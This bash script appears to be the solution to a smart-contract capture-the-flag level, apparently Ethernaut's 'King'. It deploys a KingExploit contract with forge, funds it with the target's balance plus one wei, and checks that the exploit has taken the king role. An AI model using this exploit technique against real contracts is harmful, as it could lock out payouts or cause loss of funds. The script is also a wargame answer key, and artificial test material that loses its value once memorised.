#!/usr/bin/env bash
set -e

CONTRACT="$1"

[ "$CONTRACT" == "" ] && echo "A contract address must be specified as the first argument" >&2 && exit 1
[ "$ETH_RPC_URL" == "" ] && echo "ETH_RPC_URL not set" >&2 && exit 1
[ "$CHAIN" == "" ] && echo "CHAIN not set" >&2 && exit 1

if [ "$PRIVATE_KEY" == "" ]
then
	echo "Enter private key"
	read -s "PRIVATE_KEY"
fi
PRIVATE_KEY=$(echo $PRIVATE_KEY | sed 's/^0x//')

BALANCE=$(cast balance ${CONTRACT})
let "VALUE = ${BALANCE} + 1"

echo "BALANCE: ${BALANCE}"
echo "VALUE: ${VALUE}"

echo "Deploying exploit"
EXPLOIT_ADDRESS=$(
	forge create \
		--private-key $PRIVATE_KEY \
		src/Level09Exploit.sol:KingExploit \
		--value "${VALUE} wei" \
		--constructor-args ${CONTRACT} \
	| grep "Deployed to:" \
	| awk '{print $3}' \
	| tr [:upper:] [:lower:])

echo "Exploit address: ${EXPLOIT_ADDRESS}"

KING=0x$(cast call ${CONTRACT} $(cast sig "_king()(address)") | tr -d '\t\n\r\0' | tail -c 40)
echo "King: ${KING}"

if [ "${KING}" == "${EXPLOIT_ADDRESS}" ]
then
	echo "Level completed, submit instance"
else
	echo "ERROR: Solution failed"
fi
